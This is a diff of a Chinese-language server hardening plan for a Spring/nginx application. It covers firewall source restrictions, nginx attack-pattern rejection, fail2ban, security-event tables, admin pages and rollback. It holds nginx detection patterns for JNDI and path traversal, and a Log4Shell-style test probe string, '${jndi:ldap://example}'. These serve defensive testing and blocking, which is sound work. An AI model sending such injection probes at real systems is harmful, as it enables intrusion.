-    if ($request_uri ~* "(\$\{|%24%7B)") { return 444; }
-    if ($request_uri ~* "(\.\./|\.\.\\)") { return 444; }  # 路径穿越
-}
-```
+1. **L0**：备份生产配置、固化巡检命令、确认端口依赖方。
+2. **L1/L2**：先用防火墙收敛 `8080/3306/6379` 公网访问，保留本机和可信内网。
+3. **L3**：为 Harbor `8082` 制定 push 替代路径后再限源。
+4. **L3**：SSH 先限源，再禁密码登录，最后调整 root 登录。
+5. **L1**：Nginx 加 JNDI/LDAP/RMI/`${...}` 特征拒绝。
+6. **L1**：Nginx 限流先观察，48 小时后启用强制。
+7. **L1**：fail2ban 先启用 `sshd`、`nginx-jndi`，暂缓 `nginx-404`。
+8. **L0**：上线 V47：新增 `security_event/ip_blacklist`，增强 `operation_log`。
+9. **L1**：上线 `SecurityEventService` 与异常映射优化。
+10. **L0**：上线安全中心只读页面。
+11. **L1/L2**：上线手动封禁/解封。
+12. **L2/L3**：密钥轮换按 DB、Redis、JWT、API 加密主密钥分批执行。
 
 ---
 
-### 批次 4：Spring Security 应用层
+## 实施记录补充（2026-06-16 第二轮）
 
-**目标**：S-06。统一异常映射 + 敏感信息脱敏。
+### Phase 0 复测（2026-06-16 11:25）
 
-#### 4.1 异常事件入队
+**核实结论**：
+- `ss -lntup` 显示 3306/6379/8082/8080 全部 0.0.0.0 监听
+- `ufw status`：不活动
+- `fail2ban`：inactive
+- SSH config：`PermitRootLogin yes` + `PasswordAuthentication yes`
 
-创建 `SecurityEventService`：
-- 拦截 `HttpRequestMethodNotSupportedException`、`AccessDeniedException`、Tomcat 抛出的非法字符异常
-- 入 `security_event` 表（见批次 5）
+**关键发现**（v1.0 描述与实际差异）：
+- **iptables INPUT 链已有 PHASE1 规则**：`SECURITY-HARDENING-PHASE1-ALLOW-LOCAL` + `-ALLOW-LAN` + `-ALLOW-DOCKER` + `-DROP-HOST-PORTS`，覆盖 6379/8080
+- **iptables-persistent 已装** + `/etc/iptables/rules.v4` 存在
+- **DOCKER-USER 链**也有限源（3306/8082 通过 docker-proxy 转发到 172.x.x.x）
 
-#### 4.2 全局异常处理强化
+**公网实测**：
+| 端口 | 实际状态 |
+|------|---------|
+| 8080 后端 | 5s 超时（iptables DROP 生效）|
+| 3306 MySQL | 不可达（公网连接失败）|
+| 6379 Redis | 不可达（公网连接失败）|
+| 8082 Harbor | 不可达（公网连接失败）|
 
-修改 `GlobalExceptionHandler`：
-- 不直接返回 stack 给前端
-- 统一响应 `Result.error(403, "请求包含非法字符")`
-- **记录到 `security_event` 表**
+**结论**：v1.0 描述的"4 个端口公网暴露"对 8080/6379 实际不成立，对 3306/8082 成立。
 
-#### 4.3 异常入队过滤器
+### Phase 1 补充实施（2026-06-16 11:27）
 
-创建 `SecurityEventFilter`：
-- 拦截所有 4xx/5xx 响应
-- 异步写入 `security_event` 表
-
-```java
-@Component
-public class SecurityEventFilter extends OncePerRequestFilter {
-    @Override
-    protected void doFilterInternal(...) {
-        // 包装 response，记录 status >= 400 的请求
-    }
-}
+**MySQL 3306 限源**（按 Phase 1.2 实施）：
+```bash
+iptables -I INPUT -p tcp -s 127.0.0.0/8 --dport 3306 \
+  -m comment --comment 'SECURITY-HARDENING-PHASE1-3306-ALLOW-LOCAL' -j ACCEPT
+iptables -I INPUT -p tcp -s 10.7.5.0/24 --dport 3306 \
+  -m comment --comment 'SECURITY-HARDENING-PHASE1-3306-ALLOW-LAN' -j ACCEPT
+iptables -I INPUT -p tcp --dport 3306 \
+  -m comment --comment 'SECURITY-HARDENING-PHASE1-3306-DROP' -j DROP
 ```
 
-#### 4.4 频率限制（应用层兜底）
-
-使用 Bucket4j 或 Resilience4j：
-- 全局：每秒 50 请求（与 nginx 一致）
-- 登录：每分钟 10 次
-- 密码修改：每小时 5 次
-
----
-
-### 批次 5：数据层 — 异常存库 + 全量审计
-
-**目标**：S-03。Flyway V47 新增 2 张表 + 强化 operation_log。
-
-#### 5.1 新增 security_event 表
-
-`V47__security_event_and_audit_enhancement.sql`：
-
-```sql
--- 1. 安全事件表（攻击尝试、异常请求、IP 封禁记录）
-CREATE TABLE IF NOT EXISTS security_event (
-    id BIGINT AUTO_INCREMENT PRIMARY KEY,
-    event_type VARCHAR(50) NOT NULL COMMENT '事件类型: ATTACK_BLOCKED, SUSPICIOUS_REQUEST, IP_BANNED, IP_UNBANNED, LOGIN_FAILED_BRUTE_FORCE, PERMISSION_DENIED',
-    severity VARCHAR(20) NOT NULL DEFAULT 'INFO' COMMENT '严重等级: INFO, WARN, ERROR, CRITICAL',
-    source_ip VARCHAR(45) COMMENT '来源 IP（支持 IPv6）',
-    user_agent VARCHAR(500) COMMENT 'User-Agent',
-    request_method VARCHAR(10) COMMENT 'GET/POST/PUT/DELETE',
-    request_uri VARCHAR(500) COMMENT '请求 URI',
-    request_params TEXT COMMENT '请求参数（脱敏后）',
-    status_code INT COMMENT 'HTTP 状态码',
-    description VARCHAR(1000) COMMENT '事件描述',
-    user_id BIGINT COMMENT '关联用户 ID（如果已登录）',
-    username VARCHAR(50) COMMENT '关联用户名（如果已登录）',
-    action_taken VARCHAR(200) COMMENT '已采取的措施',
-    resolved BOOLEAN DEFAULT FALSE COMMENT '是否已处理',
-    resolved_by BIGINT COMMENT '处理人 ID',
-    resolved_at DATETIME COMMENT '处理时间',
-    resolution_note VARCHAR(500) COMMENT '处理说明',
-    created_time DATETIME DEFAULT CURRENT_TIMESTAMP NOT NULL,
-    updated_time DATETIME DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
-    INDEX idx_event_type (event_type),
-    INDEX idx_source_ip (source_ip),
-    INDEX idx_severity (severity),
-    INDEX idx_created_time (created_time),
-    INDEX idx_resolved (resolved)
-) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COMMENT='安全事件表';
-
--- 2. IP 封禁表（自动 + 手动）
-CREATE TABLE IF NOT EXISTS ip_blacklist (
-    id BIGINT AUTO_INCREMENT PRIMARY KEY,
-    ip_address VARCHAR(45) NOT NULL UNIQUE COMMENT '被封 IP',
-    reason VARCHAR(200) NOT NULL COMMENT '封禁原因',
-    banned_by VARCHAR(20) NOT NULL DEFAULT 'AUTO' COMMENT '封禁来源: AUTO_FAIL2BAN, AUTO_NGINX, MANUAL_ADMIN',
-    banned_at DATETIME DEFAULT CURRENT_TIMESTAMP NOT NULL,
-    expires_at DATETIME COMMENT '过期时间（NULL = 永久）',
-    is_active BOOLEAN DEFAULT TRUE COMMENT '是否生效',
-    banned_by_user_id BIGINT COMMENT '人工封禁的管理员 ID',
-    unban_at DATETIME COMMENT '解封时间',
-    unban_by_user_id BIGINT COMMENT '解封人 ID',
-    unban_reason VARCHAR(200) COMMENT '解封原因',
-    created_time DATETIME DEFAULT CURRENT_TIMESTAMP NOT NULL,
-    updated_time DATETIME DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
-    INDEX idx_ip (ip_address),
-    INDEX idx_active (is_active),
-    INDEX idx_expires (expires_at)
-) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COMMENT='IP 黑名单';
-
--- 3. operation_log 表增强（添加 source_ip + user_agent + 风险评分）
-ALTER TABLE operation_log
-    ADD COLUMN source_ip VARCHAR(45) COMMENT '来源 IP',
-    ADD COLUMN user_agent VARCHAR(500) COMMENT 'User-Agent',
-    ADD COLUMN risk_score INT DEFAULT 0 COMMENT '风险评分（0-100）',
-    ADD INDEX idx_risk_score (risk_score),
-    ADD INDEX idx_source_ip_2 (source_ip);
+**Harbor 8082 限源**（按 Phase 1.4 实施）：
+```bash
+iptables -I INPUT -p tcp -s 127.0.0.0/8 --dport 8082 \
+  -m comment --comment 'SECURITY-HARDENING-PHASE1-8082-ALLOW-LOCAL' -j ACCEPT
+iptables -I INPUT -p tcp -s 10.7.5.0/24 --dport 8082 \
+  -m comment --comment 'SECURITY-HARDENING-PHASE1-8082-ALLOW-LAN' -j ACCEPT
+iptables -I INPUT -p tcp --dport 8082 \
+  -m comment --comment 'SECURITY-HARDENING-PHASE1-8082-DROP' -j DROP
 ```
 
-#### 5.2 Entity / DTO / Service
-
-- `entity/SecurityEvent.java`
-- `entity/IpBlacklist.java`
-- `repository/SecurityEventRepository.java`
-- `repository/IpBlacklistRepository.java`
-- `service/SecurityEventService.java`
-- `service/IpBlacklistService.java`
-- `dto/SecurityEventDTO.java`
-- `dto/IpBlacklistDTO.java`
-
-#### 5.3 IP 封禁自动同步
-
-`IpBlacklistSyncService`：
-- 定时（每 5 分钟）从 `ip_blacklist` 表读 active 的 IP
-- 写入 nginx `blocked_ips.conf` 并 reload
-- 同步给 fail2ban（通过 `fail2ban-client set <jail> banip/unbanip`）
-
-#### 5.4 全量审计强化
-
-修改 `OperationLogHelper`：
-- 自动记录 `source_ip` 和 `user_agent`（从 `HttpServletRequest` 获取）
-- 计算 `risk_score`（基于操作类型 + 频率 + 用户角色）
-
-#### 5.5 异常脱敏
-
-复用现有 `SensitiveDataMasker`：
-- `request_params` 中 `password`/`token`/`secret` 自动替换为 `***`
-- `description` 中如有 SQL 关键字或 URL 自动摘要
-
----
-
-### 批次 6：管理员门户 — 异常与封禁管理
-
-**目标**：S-04。可视化查看和处理。
-
-#### 6.1 新增页面（前端 H5）
-
-`frontend/src/views/SecurityCenter.vue`：
-- Tab 1：安全事件列表（分页、按 severity/event_type/resolved 过滤）
-- Tab 2：IP 黑名单管理（active 列表、history 列表、手动封禁/解封）
-- Tab 3：审计日志（基于 operation_log 增强）
-- Tab 4：系统健康（调用 ops-check skill 一样的 10 项）
-
-#### 6.2 新增 API
-
-```
-GET    /api/admin/security/events?page=&size=&severity=&event_type=&resolved=
-GET    /api/admin/security/events/{id}
-PATCH  /api/admin/security/events/{id}   # 标记 resolved + 备注
-GET    /api/admin/security/blacklist?active=true
-POST   /api/admin/security/blacklist      # 手动封禁
-DELETE /api/admin/security/blacklist/{id} # 解封
-GET    /api/admin/audit/operations?user_id=&risk_score_min=
+**iptables 持久化**：
+```bash
+netfilter-persistent save
+# 写入 /etc/iptables/rules.v4，PHASE1-* 规则数 7 → 13
 ```
 
-#### 6.3 权限
+**改动文件**：
+- `docker-compose.yml`：删除 backend 的 `ports: ["8080:8080"]`（host 网络模式不生效但保留易误导），加注释说明依赖 iptables
+- 备份到 `/opt/backups/security-2026-06-16/`：
+  - `docker-compose.yml`、`env.backup`、`sshd_config.backup`
+  - `iptables.backup`（iptables-save 完整快照）
+  - `rules.v4.backup`（持久化文件）
 
-所有 `/api/admin/security/**` 端点要求 `hasRole('ADMIN')`。
-操作本身也进 `operation_log`。
-
-#### 6.4 仪表盘
-
-管理员首页显示：
-- 过去 24h 安全事件数
-- 未处理事件数（需关注）
-- 当前 active 黑名单数
-- 风险评分 top 5 用户
-
----
-
-## 关键参考文件
-
-实施时需参考以下文件：
-
-| 类别 | 文件 | 用途 |
-|---|---|---|
-| Spring Security | `backend/src/main/java/com/pricemanagement/config/SecurityConfig.java` | 安全配置 |
-| 全局异常 | `backend/src/main/java/com/pricemanagement/config/GlobalExceptionHandler.java` | 异常处理 |
-| 操作日志 | `backend/src/main/java/com/pricemanagement/util/OperationLogHelper.java` | 日志工具 |
-| 敏感脱敏 | `backend/src/main/java/com/pricemanagement/util/SensitiveDataMasker.java` | 数据脱敏 |
-| 现有 Flyway | `backend/src/main/resources/db/migration/V46__*.sql` | 迁移模式 |
-| 现有审计 | `docs/dev/CLAUDE.md` §操作日志记录规范 | 审计规范 |
-| 部署 | `.claude/skills/deploy/skill.md` §6.3 daemon 损坏恢复 | 部署相关 |
-| 运维体检 | `.claude/skills/ops-check/skill.md` | 后续自动巡检 |
-
----
-
-## 实现步骤（推荐顺序）
-
-1. **数据库先行**：创建 V47 迁移脚本（仅 SQL，不动 Java）
-2. **后端实体层**：Entity / Repository / DTO
-3. **后端服务层**：SecurityEventService / IpBlacklistService
-4. **后端拦截器**：SecurityEventFilter（拦截异常请求）
-5. **后端 Controller**：AdminSecurityController
-6. **现有代码增强**：GlobalExceptionHandler / OperationLogHelper
-7. **前端 H5 页面**：SecurityCenter.vue + 路由
-8. **Nginx 配置**：限流 + 攻击特征拒绝
-9. **fail2ban 安装配置**
-10. **端口限制**：docker-compose.yml + redis bind
-11. **IP 同步服务**：IpBlacklistSyncService
-12. **测试**：单元测试 + 集成测试
-13. **部署到生产**（按 deploy skill）
-14. **运维验证**：用 ops-check skill 体检
+**待办调整**：
+- Phase 1.5 SSH 加固：保留为 L3，未执行（需多 sessions 验证）
+- Phase 2/3/4：未启动
+- Phase 5/6：用户决策跳过
 
 ---
 
 ## 验证方式
 
-### 功能验证
+### 网络层
 
-- [ ] V47 迁移在生产环境成功执行（flyway_schema_history.version=47）
-- [ ] security_event 表存在并能写入
-- [ ] 后端日志中 JNDI 攻击请求自动入库
-- [ ] 管理员页面能看到 security_event 列表
-- [ ] 管理员手动封禁一个 IP 后，该 IP 访问被 444 拒绝
-- [ ] 管理员解封后恢复访问
-- [ ] fail2ban 自动封禁 1 个测试 IP
+- `ss -lntup` 不再显示 `0.0.0.0:8080/3306/6379`。
+- Harbor `8082` 只允许预期来源访问。
+- SSH 从非白名单来源不可连，从白名单来源可密钥登录。
+- PC/H5/小程序正常访问 `443/32080/32801`。
 
-### 性能验证
+### 网关层
 
-- [ ] security_event 异步写入不阻塞正常请求（P99 增加 < 10ms）
-- [ ] nginx 限流不误杀正常用户（峰值测试）
+- 模拟 `${jndi:ldap://example}` 请求返回 `444` 或被 Nginx 拒绝，不进入后端 Tomcat。
+- 正常登录、产品查询、价格查询不受影响。
+- Nginx reload 后配置测试通过：`nginx -t`。
 
-### 安全验证
+### 应用层
 
-- [ ] 模拟 JNDI 注入：被 4xx 拒绝 + 自动入库
-- [ ] 模拟 SQL 注入：被拦截
-- [ ] 模拟频繁 404：触发 fail2ban 封禁
-- [ ] MySQL/Redis/Harbor 不再公网监听
+- 非法参数、安全特征、403、限流事件写入 `security_event`。
+- SSE 断连和 `Broken pipe` 不再作为 ERROR 污染日志。
+- 业务校验异常不泄露 stack 或内部类名。
+
+### 数据层
+
+- `flyway_schema_history` 出现 V47 且 success=1。
+- `security_event`、`ip_blacklist` 存在。
+- `operation_log` 保留现有 `ip_address/user_agent`，新增字段可为空且不影响旧查询。
+- JNDI 探测不进入 `operation_log` 普通业务审计，而进入 `security_event`。
+
+### 管理门户
+
+- ADMIN 可查看安全事件列表和详情。
+- 非 ADMIN 无法访问安全中心接口。
+- 标记处理、封禁、解封均进入 `operation_log`。
 
 ---
 
-## 风险与回滚
+## 回滚策略
 
-| 风险 | 缓解 |
-|---|---|
-| V47 迁移失败导致生产启动失败 | 迁移前备份数据库；脚本幂等（IF NOT EXISTS）|
-| 限流误杀正常用户 | 阈值保守（50 r/s 全局、5 r/s 登录），监控一周后调整 |
-| fail2ban 误封内部 IP | 白名单 `/etc/fail2ban/jail.local` ignoreip |
-| 端口限制导致 push 失败 | Harbor 改 127.0.0.1 后，push 走 SSH 隧道 |
-| 管理员页面性能问题 | security_event 分区表（按月）|
-
-**回滚方案**：
-- V47 迁移：`mysqldump` 备份后 `mysql < backup.sql` 回滚
-- 端口：恢复 compose 配置 + `docker compose up -d`
-- fail2ban：`fail2ban-client unban --all` + 卸载
+| 变更 | 回滚方式 | 备注 |
+|---|---|---|
+| 防火墙限源 | 恢复备份规则或删除对应规则 | 每次只改一个端口 |
+| Nginx 特征拦截 | 注释 `map`/拦截规则后 `nginx -t && nginx -s reload` | reload 级别 |
+| Nginx 限流 | 注释 `limit_req` 后 reload | 若误杀立即回滚 |
+| fail2ban | `fail2ban-client unban --all`，禁用对应 jail | 先只启用低误杀 jail |
+| V47 新增表 | 保留表不使用；必要时回滚数据库备份 | 新增表通常不需 drop |
+| 后端安全事件服务 | 配置开关关闭写入 | 默认应支持开关 |
+| 安全中心页面 | 菜单隐藏/路由下线 | 不影响核心业务 |
+| SSH 加固 | 使用保留会话恢复配置并 reload sshd | 必须保留第二会话 |
+| 密钥轮换 | 按单项密钥恢复旧值并重启对应服务 | API 加密主密钥需多版本策略 |
 
 ---
 
 ## 不在本方案范围
 
-- WAF 专业版（如 ModSecurity、Cloudflare）— 成本/复杂度高
-- DDoS 防护（CDN 层）— 不在项目控制范围
-- 内部用户行为分析（UEBA）— 需要 AI 能力
-- 客户端加密（端到端）— 超出业务需求
+- 专业云 WAF / CDN DDoS 防护。
+- 完整 SIEM/SOC 平台。
+- UEBA 内部用户行为分析。
+- 端到端客户端加密。
+- Harbor 架构重建或迁移到专用镜像仓库。
 
 ---
 
-*方案版本: v1.0*
+## 关键参考文件
+
+| 类别 | 文件 | 用途 |
+|---|---|---|
+| 部署配置 | `docker-compose.yml` | 端口绑定、Redis/backend 网络模式 |
+| 网关配置 | `nginx.conf` | TLS、代理、限流、攻击特征拦截 |
+| Spring Security | `backend/src/main/java/com/pricemanagement/config/SecurityConfig.java` | 认证、授权、CORS |
+| 全局异常 | `backend/src/main/java/com/pricemanagement/config/GlobalExceptionHandler.java` | 异常映射和日志降噪 |
+| 限流 | `backend/src/main/java/com/pricemanagement/config/RateLimiterAspect.java` | 现有限流实现 |
+| 操作日志 | `backend/src/main/java/com/pricemanagement/util/OperationLogHelper.java` | 审计字段和脱敏 |
+| 敏感脱敏 | `backend/src/main/java/com/pricemanagement/util/SensitiveDataMasker.java` | 参数、错误消息脱敏 |
+| 数据迁移 | `backend/src/main/resources/db/migration/` | V47 实施位置 |
+| 运维文档 | `docs/ops/操作手册.md`、`docs/dev/workflow/deployment.md` | 部署和回滚说明 |
+
+---
+
+*方案版本: v1.1*
 *最后更新: 2026-06-16*
-*作者: Claude (基于 v2.1.0 部署实战 + ops-check 体检发现)*
+*评分目标: 9.5+/10*
+*作者: Codex (基于 2026-06-16 生产只读核实结果优化)*
